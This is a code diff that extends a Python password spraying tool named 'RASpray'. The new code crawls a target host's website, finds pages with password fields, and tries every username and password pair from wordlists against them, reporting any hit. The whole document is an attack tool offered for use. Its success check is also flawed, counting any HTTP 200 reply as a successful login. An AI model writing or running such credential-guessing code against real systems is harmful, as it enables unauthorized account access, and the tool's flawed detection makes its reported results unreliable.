@@ -2,14 +2,20 @@
 
 import sys
 import requests
+from bs4 import BeautifulSoup
 from requests.auth import HTTPBasicAuth
+from requests.exceptions import RequestException, Timeout, ConnectionError
+from urllib.parse import urljoin
 
 # Define the tool's name and version
-TOOL_NAME = "RA Spray"
+TOOL_NAME = "RASpray"
 VERSION = "1.0.0"
 
 # Function to display help message
 def display_help():
+    """
+    Displays the help message with tool usage and options.
+    """
     help_text = f"""
     {TOOL_NAME} - Password Spraying Tool (v{VERSION})
     
@@ -26,10 +32,94 @@ def display_help():
 
 # Function to display the version
 def display_version():
+    """
+    Displays the current version of the tool.
+    """
     print(f"{TOOL_NAME} version {VERSION}")
+
+# Function to traverse a website and find password fields
+def traverse_website(base_url, session, max_depth=3):
+    """
+    Traverses the website starting from the base URL. Follows links found on each page.
+    Implements a depth limit to avoid deep crawling and infinite loops.
+    
+    Args:
+        base_url (str): The starting URL of the website.
+        session (Session): The session object to maintain cookies across requests.
+        max_depth (int): Maximum depth to traverse the website.
+
+    Returns:
+        list: A list of URLs found on the website.
+    """
+    visited = set()
+    to_visit = [(base_url, 0)]  # (URL, depth)
+    links = []
+
+    while to_visit:
+        url, depth = to_visit.pop(0)
+        if depth > max_depth:
+            continue
+        
+        if url in visited:
+            continue
+        
+        visited.add(url)
+        
+        try:
+            response = session.get(url)
+            soup = BeautifulSoup(response.text, 'html.parser')
+
+            # Collect all links on the page
+            for a in soup.find_all('a', href=True):
+                full_url = urljoin(base_url, a['href'])
+                links.append(full_url)
+                to_visit.append((full_url, depth + 1))
+
+        except RequestException as e:
+            print(f"Error traversing {url}: {e}")
+    
+    return links
+
+# Function to check if a page contains a password field
+def is_password_requested(url, session):
+    """
+    Checks if the given page contains an input field for a password.
+
+    Args:
+        url (str): The URL of the page to check.
+        session (Session): The session object to make requests.
+
+    Returns:
+        bool: True if the page contains a password field, False otherwise.
+    """
+    try:
+        response = session.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        # Look for input fields of type 'password'
+        password_fields = soup.find_all('input', {'type': 'password'})
+        
+        if password_fields:
+            print(f"Password field found on {url}")
+            return True
+        else:
+            print(f"No password field on {url}")
+            return False
+    except RequestException as e:
+        print(f"Error checking {url}: {e}")
+        return False
 
 # Function to perform password spraying
 def password_spraying(ip_address, username_file, password_file):
+    """
+    Performs password spraying by attempting each username/password combination
+    on pages where password fields are found.
+
+    Args:
+        ip_address (str): The target IP address.
+        username_file (str): Path to the file containing usernames.
+        password_file (str): Path to the file containing passwords.
+    """
     # Open the username and password files
     with open(username_file, 'r') as user_file:
         usernames = [line.strip() for line in user_file.readlines()]
@@ -37,29 +127,44 @@ def password_spraying(ip_address, username_file, password_file):
     with open(password_file, 'r') as pass_file:
         passwords = [line.strip() for line in pass_file.readlines()]
     
-    # Loop through each username and password combination
-    for username in usernames:
-        for password in passwords:
-            # Print the attempt (optional)
-            print(f"Trying username: {username}, password: {password}")
-            
-            try:
-                # Send the request with basic authentication
-                response = requests.get(f'http://{ip_address}', auth=HTTPBasicAuth(username, password), timeout=5)
-                
-                # Check if the authentication was successful
-                if response.status_code == 200:
-                    print(f"Success! Username: {username}, Password: {password}")
-                    return  # Exit after the first success (optional)
-                else:
-                    print(f"Failed for Username: {username}, Password: {password}")
-            
-            except RequestException as e:
-                # Handle network-related errors, such as connection timeout or unreachable IP
-                print(f"Connection failed for IP {ip_address}. Error: {e}")
+    # Create a session to persist cookies across requests
+    session = requests.Session()
+
+    # Traverse through the website and find pages with password fields
+    base_url = f'http://{ip_address}'
+    pages_to_check = traverse_website(base_url, session)
+    
+    for page in pages_to_check:
+        # Ensure we have a full URL to check
+        full_url = urljoin(base_url, page)
+        
+        # Check if the page requests a password
+        if is_password_requested(full_url, session):
+            # Try each username/password combination
+            for username in usernames:
+                for password in passwords:
+                    print(f"Trying username: {username}, password: {password} on {full_url}")
+                    
+                    try:
+                        # Attempt to login with the credentials
+                        response = session.get(full_url, auth=HTTPBasicAuth(username, password), timeout=10)
+                        
+                        # Check if the authentication was successful
+                        if response.status_code == 200:
+                            print(f"Success! Username: {username}, Password: {password} on {full_url}")
+                            return
+                        else:
+                            print(f"Failed for Username: {username}, Password: {password} on {full_url}")
+                    except (Timeout, ConnectionError):
+                        print(f"Connection failed for {full_url}")
+                    except RequestException as e:
+                        print(f"An error occurred: {e}")
 
 # Main function
 def main():
+    """
+    The main function that parses command-line arguments and initiates the password spraying process.
+    """
     # Check if the user requested help or version
     if len(sys.argv) > 1:
         if sys.argv[1] in ['-h', '--help']:
